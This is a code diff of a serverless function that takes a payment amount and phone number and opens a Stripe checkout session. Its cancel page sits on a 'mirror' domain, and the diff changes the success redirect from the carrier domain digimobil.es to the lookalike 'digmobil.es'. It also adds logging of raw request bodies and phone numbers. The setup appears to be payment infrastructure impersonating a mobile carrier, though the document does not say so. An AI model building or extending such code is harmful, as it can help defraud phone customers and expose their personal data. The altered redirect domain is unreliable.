@@ -21,20 +21,23 @@ exports.handler = async (event, context) => {
     let amount, phoneNumber, successUrl, cancelUrl;
     const clientIP = event.headers['client-ip'] || event.headers['x-forwarded-for'] || 'unknown-client';
 
+    // Extract request data
     if (contentType.includes('application/json')) {
-      const data = JSON.parse(event.body);
-      amount = data.amount;
-      phoneNumber = data.phoneNumber;
-      successUrl = data.successUrl || `https://www.digimobil.es/`;
-      cancelUrl = data.cancelUrl || `https://${MIRROR_DOMAIN}/payment-cancel`;
-      
-      // Debug what we received
-      console.log('JSON data received:', {
-        amount,
-        phoneNumber: phoneNumber || 'none',
-        successUrl: successUrl || 'none',
-        cancelUrl: cancelUrl || 'none'
-      });
+      try {
+        const data = JSON.parse(event.body);
+        amount = data.amount;
+        phoneNumber = data.phoneNumber;
+        successUrl = data.successUrl || `https://www.digmobil.es/`;
+        cancelUrl = data.cancelUrl || `https://${MIRROR_DOMAIN}/payment-cancel`;
+        
+        // Log raw data
+        console.log('API RECEIVED RAW JSON:', event.body);
+        console.log('API PHONE NUMBER TYPE:', typeof phoneNumber);
+        console.log('API PHONE NUMBER VALUE:', phoneNumber);
+      } catch (e) {
+        console.error('Error parsing JSON:', e);
+        console.log('RAW BODY:', event.body);
+      }
     } else if (contentType.includes('application/x-www-form-urlencoded')) {
       const params = new URLSearchParams(event.body);
       amount = params.get('amount');
@@ -64,7 +67,7 @@ exports.handler = async (event, context) => {
     const { session } = await createStripeCheckoutSession(
       parseFloat(amount),
       phoneNumber,
-      `https://www.digimobil.es/`, // Updated success URL
+      `https://www.digmobil.es/`, // Updated success URL
       `https://${MIRROR_DOMAIN}/payment-cancel`,
       clientIP
     );
